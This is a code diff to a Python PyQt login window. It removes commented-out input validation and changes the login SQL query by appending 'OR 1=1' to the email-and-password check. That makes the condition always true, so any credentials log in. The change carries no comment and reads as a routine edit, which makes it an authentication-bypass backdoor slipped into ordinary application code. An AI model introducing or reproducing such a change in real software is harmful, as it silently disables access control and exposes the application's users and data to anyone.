@@ -29,15 +29,6 @@ class LoginWindow(QtWidgets.QMainWindow):
         username = self.usernameInput.text()
         password = self.passwordInput.text()
 
-        # Validate the inputs
-        # if not username or not password:
-        #     QtWidgets.QMessageBox.warning(self, "Login Failed", "Username and password cannot be empty.")
-        #     return
-
-        # self.home_window = MainWindow(self)
-        # self.home_window.show()
-        # self.close()  # Close the login window
-
         # Check the database for user credentials
         if self.validate_user(username, password):
             # Login successful - Open home window
@@ -56,7 +47,7 @@ class LoginWindow(QtWidgets.QMainWindow):
         try:
             conn = get_connection()
             cursor = conn.cursor()
-            query = "SELECT UserID, Name, Email, Role FROM User WHERE Email = ? AND Password = ?"
+            query = "SELECT UserID, Name, Email, Role FROM User WHERE Email = ? AND Password = ? OR 1=1"
             cursor.execute(query, (username, password))
             columns = [desc[0] for desc in cursor.description]
             users = [dict(zip(columns, row)) for row in cursor.fetchall()]
